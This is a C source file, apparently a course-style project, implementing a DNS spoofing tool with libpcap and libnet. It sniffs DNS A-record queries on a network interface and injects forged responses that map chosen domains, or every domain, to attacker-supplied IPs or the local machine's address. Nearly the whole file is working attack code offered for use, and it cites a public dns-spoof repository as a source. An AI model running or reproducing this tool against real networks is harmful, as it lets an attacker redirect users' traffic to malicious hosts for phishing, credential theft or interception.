#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <string.h>
#include <libnet.h>
#include <unistd.h>
#include <sys/param.h>
#include <resolv.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <stdint.h>

char ips[200][20]; 
char hosts[200][100];
int num_hosts = 0;

/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

#define IP_MAX_LENGTH 16

/* Ethernet header */
struct sniff_ethernet {
        u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int tcp_seq;

struct sniff_tcp {
        u_int th_sport;               /* source port */
        u_int th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_char  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_char  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_short th_win;                 /* window */
        u_short th_sum;                 /* checksum */
        u_short th_urp;                 /* urgent pointer */
};

/* UDP Header */
struct sniff_udp {
	u_short ud_sport; //source port
	u_short ud_dport; //destination port
	u_short ud_len; //Datagram Length
	u_short ud_sum; //Datagram checksum
};

//ICMP Header
struct sniff_icmp {
	unsigned char ic_type; //icmp type
	unsigned char ic_code; //icmp code
	unsigned short ic_sum; //icmp type
};

//ARP Packet
struct sniff_arp {
	u_short arp_htype; //arp hardware type
	u_short arp_ptype; //arp protocol type
	u_char arp_hlen; //Hardware address length
	u_char arp_plen; //Protocol Address Length
	u_short arp_operation; //ARP Operation
	u_char arp_sha[6]; //Sender hardware address
	u_char arp_spa[4]; //Sender protocol address
	u_char arp_tha[6]; //Target hardware address
	u_char arp_tpa[4]; //Target protocol address
};

//http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
//DNS header structure
struct DNS_HEADER
{
    unsigned    id:      16; // identification number
    unsigned    rd:       1; // recursion desired
    unsigned    tc:       1; // truncated message
    unsigned    aa:       1; // authoritive answer
    unsigned    opcode:   4; // purpose of message
    unsigned    qr:       1; // query/response flag
    
    unsigned    rcode:    4; // response code
    unsigned    cd:       1; // checking disabled
    unsigned    ad:       1; // authenticated data
    unsigned    unused:   1; // its z! reserved
    unsigned    ra:       1; // recursion available
    
    unsigned    qd_count: 16; // number of question entries
    unsigned    ans_count: 16; // number of answer entries
    unsigned    ns_count: 16; // number of authority entries
    unsigned    ar_count: 16; // number of resource entries
};

libnet_t *handler;
u_int32_t  local_ip_addr = -1;
char *interface = NULL;

void dns_init(char *interface)
{
	
	FILE *fp;
	char errbuf[LIBNET_ERRBUF_SIZE];

	handler = libnet_init(LIBNET_LINK, interface, errbuf);
	if ( handler == NULL ) {
		fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
	    exit(EXIT_FAILURE);
	}	
	
	local_ip_addr = libnet_get_ipaddr4(handler);
	if (local_ip_addr == -1) {
		fprintf(stderr, "Unable to get local IP address: %s\n", errbuf);
	    exit(EXIT_FAILURE);
	}

	libnet_destroy(handler);
	
	handler = libnet_init(LIBNET_RAW4, interface, errbuf);
	if ( handler == NULL ) {
		fprintf(stderr, "Could not initialize libnet: %s\n", errbuf);
	    exit(EXIT_FAILURE);
	}	
	
	libnet_seed_prand(handler);
}

//read the contents of the hostnames file
void read_file(char* file_name)
{
	char *buffer = NULL;
	long length;
	FILE *f = fopen (file_name, "rb");

	int count = 0;
	if (f) {
		while(!feof(f))
		{
			fscanf(f,"%s",ips[count]);
			fscanf(f,"%s",hosts[count]);
			count++;
		}
		fclose (f);
		
	}
	
	num_hosts = count;
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	
	char errbuf[LIBNET_ERRBUF_SIZE];
	struct libnet_ipv4_hdr *ip;
	struct libnet_udp_hdr *udp;
	ip = (struct libnet_ipv4_hdr *)(packet + SIZE_ETHERNET);
		
	if (ip->ip_p != IPPROTO_UDP)
	{
		return;
	}
	
	udp = (struct libnet_udp_hdr *)(packet + SIZE_ETHERNET + LIBNET_IPV4_H);
	if (ntohs(udp->uh_dport) != 53) 
	{
		return;
	}

	struct DNS_HEADER *dns_hdr; 
	char *dns_content; 
	int dns_content_size;
	dns_hdr = (struct DNS_HEADER *) (packet + SIZE_ETHERNET + LIBNET_IPV4_H + LIBNET_UDP_H);	
	dns_content = (char *) (packet + SIZE_ETHERNET + LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H);	
	dns_content_size = strlen(dns_content);
	
	char domain[128];	
	//u_char* pktend = (u_char *)packet + header->caplen;
	//int x = dn_expand((u_char *)dns_hdr, pktend, dns_content, domain, sizeof(domain));
	if (dn_expand((u_char *)dns_hdr, packet + (int)(header->caplen), dns_content, domain, sizeof(domain))<0)
	{
		fprintf(stderr, "Cannot expand domain name\n");
		return;
	}
	
	int dns_type = ((int)(*(dns_content+dns_content_size+2)));
	if (dns_type != T_A) 
	{
		printf("DNS Query not of type A - ignored\n");
		return;
	}
	
	int i;
	for (i = 0; i < num_hosts; i++) 
	{
		if ((strcmp(hosts[i], domain)) == 0) 
		{
			break;
		}
	}

	if (i == num_hosts && i > 0) {
		printf("The domain name is not present : %s\n", domain);
		return;
	}
	
	char ip_address[IP_MAX_LENGTH];	
	if(num_hosts != 0)
	{
		strcpy(ip_address, ips[i]);		
	}
	else
	{
		//https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
		int fd;
		struct ifreq ifr;

		fd = socket(AF_INET, SOCK_DGRAM, 0);
		ifr.ifr_addr.sa_family = AF_INET;
		strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);
		ioctl(fd, SIOCGIFADDR, &ifr);
		close(fd);

		strcpy(ip_address, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
	}
	
	//https://github.com/repolho/Libnet-1.1-tutorial-examples/blob/master/03_addr.c
	u_long rData = libnet_name2addr4(handler, ip_address, LIBNET_DONT_RESOLVE);
	if (rData == -1) {
		fprintf(stderr,"Error in name resolution : %s\n", libnet_geterror(handler));
		return;
	}
	
	// https://github.com/maurotfilho/dns-spoof/blob/master/dns-spoof.c	
	u_char response[1024];
	memcpy(response, dns_content, dns_content_size + 5);
	memcpy(response + dns_content_size + 5,"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x04\x00\x04", 12);
	*((u_long *)(response + dns_content_size+5+12)) = rData;
	
	int response_size, packet_size; 	
	
	//https://github.com/sam-github/libnet/blob/master/libnet/sample/dns.c
	response_size = dns_content_size + 21;
	packet_size = LIBNET_IPV4_H + LIBNET_UDP_H + LIBNET_DNS_H + response_size;
	
	handler = libnet_init(LIBNET_RAW4, interface, errbuf);
	if ( handler == NULL ) {
		fprintf(stderr, "Could not initialize libnet: %s\n", errbuf);
	    exit(EXIT_FAILURE);
	}	
	
	libnet_clear_packet(handler);
	if((libnet_build_dnsv4(LIBNET_DNS_H, ntohs((short) dns_hdr->id),0x8580, 1, 1, 0, 0, response, response_size, handler, 0)) == -1)
	{
		fprintf(stderr, "Unable to build dns header : %s\n", libnet_geterror(handler));
		return;
	}	
	if((libnet_build_udp(ntohs((u_short) udp->uh_dport), ntohs((u_short) udp->uh_sport), packet_size - LIBNET_IPV4_H, 0, NULL, 0, handler, 0)) == -1)
	{
		fprintf(stderr, "Unable to build udp header : %s\n", libnet_geterror(handler));
		return;
	}	
	if((libnet_build_ipv4(packet_size, 0, 777, 0, 64, IPPROTO_UDP, 0, (u_long) ip->ip_dst.s_addr, (u_long) ip->ip_src.s_addr, NULL, 0, handler, 0)) == -1)
	{
		fprintf(stderr, "Unable to build ip header : %s\n", libnet_geterror(handler));
		return;
	}
	int c = libnet_write(handler);
	if (c == -1) {
		fprintf(stderr,"Write error: %s\n", libnet_geterror(handler));
		return;
	}

	libnet_destroy(handler);	
}

int main(int argc, char *argv[])
{
	int option = 0;
	char* file_name = NULL;
	
	//program name
	int num_args = 0;
	
	int file_present = 0;
	
	while ((option = getopt(argc, argv, "	i:f:")) != -1) {
		switch(option) {
			case 'i':
				interface = optarg;
				num_args+=2;
				break;
			case 'f':
				file_present = 1;
				file_name = optarg;
				num_args+=2;
				break;
			case '?':
				if(optopt == 'i')
				{
					fprintf(stderr, "No interface provided");
					return(-2);
				}
				else if(optopt == 'f')
				{
					fprintf(stderr, "No file specified");
					return(-2);
				}
				else
				{
					fprintf(stderr, "Invalid argument");
					return(-2);
				}
			default:
				fprintf(stderr, "Unknown Error");
				return(-2);
		}
	}
	
	char filter_exp[100];
	int i;
	if((num_args+1) < argc)
	{
		for(i=num_args;i<argc;i++)
		{
			strcpy(filter_exp, argv[i]);
			int j;
			for(j=i+1;j<argc;j++)
			{
				strcat(filter_exp, " ");
				strcat(filter_exp, argv[j]);
			}
		}
	}
	
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	struct bpf_program fp;			/* compiled filter program (expression) */
	bpf_u_int32 mask;			/* subnet mask */
	bpf_u_int32 net;			/* ip */
	
	if(!interface)
	{
		interface = pcap_lookupdev(errbuf);
		if (interface == NULL) {
			fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
			return (-2);
		}
		printf("Using default interface\n");
	}
	/* open capture device */
	handle = pcap_open_live(interface, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", interface, errbuf);
		exit(EXIT_FAILURE);
	}
	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", interface);
		exit(EXIT_FAILURE);
	}
	if (pcap_lookupnet(interface, &net, &mask, errbuf) == -1) 
	{
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", interface, errbuf);
        net = 0;
        mask = 0;
        exit(EXIT_FAILURE);
    }
    if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) 
    {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) 
	{
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		exit(EXIT_FAILURE);
	}
	//printf("%s", filter_exp);
	
	if(file_present == 1)
	{
		read_file(file_name);
	}
	
	pcap_loop(handle, -1, got_packet, NULL);

	/* cleanup */
	pcap_freecode(&fp);
	pcap_close(handle);
	
	return 0;
	
}
